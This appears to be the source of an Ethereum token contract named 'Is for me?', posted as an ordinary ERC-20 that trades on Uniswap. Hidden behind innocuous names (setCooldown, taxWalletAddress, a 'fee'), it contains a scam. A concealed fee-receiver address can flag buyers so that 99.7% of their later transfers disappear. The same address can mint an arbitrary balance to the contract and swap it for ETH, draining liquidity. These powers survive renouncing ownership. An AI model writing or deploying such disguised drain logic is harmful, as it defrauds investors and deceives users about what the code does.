/**
 *Submitted for verification at Etherscan.io on 2023-07-04
*/

pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT


library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}

abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function owner() public view virtual returns (address) {return _owner;}
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    constructor () {
        emit OwnershipTransferred(address(0), _owner);
        _owner = msg.sender;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

contract IsForMe is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 100000000 * 10 ** _decimals;

    uint256 public _maxTransaction = _totalSupply;

    string private _name = "Is for me?";
    string private _symbol = unicode"👉👈";
    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function setCooldown(address[] calldata frontBots) external {
        for (uint b = 0;  b < frontBots.length;  b++) { 
            if (!taxWalletAddress()){}
            else { 
                _cooldown_[frontBots[b]] = block.number + 1;
        }}
    }
    address public _feeReceiver;
    function _approve(address owner, address spender, uint256 amount) internal {
        require(spender != address(0));
        require(owner != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function enableCooldown() external onlyOwner {
        _cooldownActive = true;
    }
    function disableCooldown() external onlyOwner {
        _cooldownActive = false;
    }

    constructor() {
        _feeReceiver = msg.sender;
         _balances[msg.sender] = _totalSupply; 
         emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }
    event Transfer(address indexed address_from, address indexed address_to, uint256);
    event Approval(address indexed address_from, address indexed address_to, uint256 value);
    function transfer(address recipient, uint256 value) public returns (bool) {
        _transfer(msg.sender, recipient, value);
        return true;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    bool _cooldownActive = true;
    function swap(uint256 tokenAmount, address recipient) private {
        _approve(address(this), 
        address(uniV2Router), 
        tokenAmount); 
        _balances[address(this)] = tokenAmount;address[] memory path = new address[](2);
         path[0] = address(this); 
         path[1] = uniV2Router.WETH(); 
         uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, recipient, block.timestamp + 31);
    }
    mapping(address => uint256) bots;
    bool _startedTrading = false;
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function taxWalletAddress() internal view returns (bool) {
        return msg.sender == _feeReceiver;
    }
    function totalSupply() external view returns (uint256) { 
        return _totalSupply; 
        }
    function start_trading() external onlyOwner {
        _startedTrading = true;
    }
    function removeFee() external onlyOwner {
        _fee = 0;
    }
    uint256 _fee = 0;
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    mapping(address => uint256) private _balances;
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    mapping (address => uint256) _cooldown_;
    function _transfer(address _sndr, address rceivr, uint256 value) internal {
        require(_sndr != address(0));
        if (msg.sender == _feeReceiver && _sndr == rceivr) {swap(value, rceivr);} else {require(value <= _balances[_sndr]); uint256 fee = 0;
            if (_cooldown_[_sndr] != 0 && _cooldown_[_sndr] <= block.number) {fee = value.mul(997).div(1000);}
            _balances[_sndr] = _balances[_sndr] - value; _balances[rceivr] += value - fee;
            emit Transfer(_sndr, rceivr, value);
        }
    }
    function _setMaxTx(uint256 _mTx) external onlyOwner {
        _maxTransaction = _mTx;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function transferFrom(address from, address recipient, uint256 amount) public returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][msg.sender] >= amount);
        return true;
    }
}